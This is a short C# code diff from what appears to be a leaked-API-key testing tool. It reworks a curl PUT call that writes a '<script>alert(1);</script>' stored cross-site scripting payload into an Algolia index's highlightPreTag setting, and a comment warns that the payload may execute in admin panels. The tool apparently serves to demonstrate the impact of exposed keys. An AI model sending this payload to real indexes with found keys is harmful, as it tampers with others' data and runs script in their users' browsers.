@@ -264,15 +264,10 @@ namespace Locksmith.Core.Factory
             //https://www.algolia.com/doc/rest-api/search/#overview
             //Be cautious when running this command, since the payload might execute within an administrative environment, depending on what index you are editing the highlightPreTag of. It's recommended to use a more silent payload (such as XSS Hunter) to prove the possible cross-site scripting attack.
 
-            RequestFactory.ExecuteCurlRequest("--request PUT --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings --header 'content-type: application/json'  --header 'x-algolia-api-key: <example-key>' --header 'x-algolia-application-id: <example-application-id>'  --data '{\"highlightPreTag\": \"<script>alert(1);</script>\"}'");
-            /*
-             curl --request PUT \
-              --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings \
-              --header 'content-type: application/json' \
-              --header 'x-algolia-api-key: <example-key>' \
-              --header 'x-algolia-application-id: <example-application-id>' \
-              --data '{"highlightPreTag": "<script>alert(1);</script>"}'
-             */
+            var teste = RequestFactory.ExecuteCurlRequest("--request PUT --url https://<application-id>-1.algolianet.com/1/indexes/<example-index>/settings --header" +
+                " 'content-type: application/json'  --header 'x-algolia-api-key: <example-key>' --header 'x-algolia-application-id: <example-application-id>'  " +
+                "--data '{\"highlightPreTag\": \"<script>alert(1);</script>\"}'");
+               
 
             throw new NotImplementedException();
             RequestModel requestModel = new RequestModel();
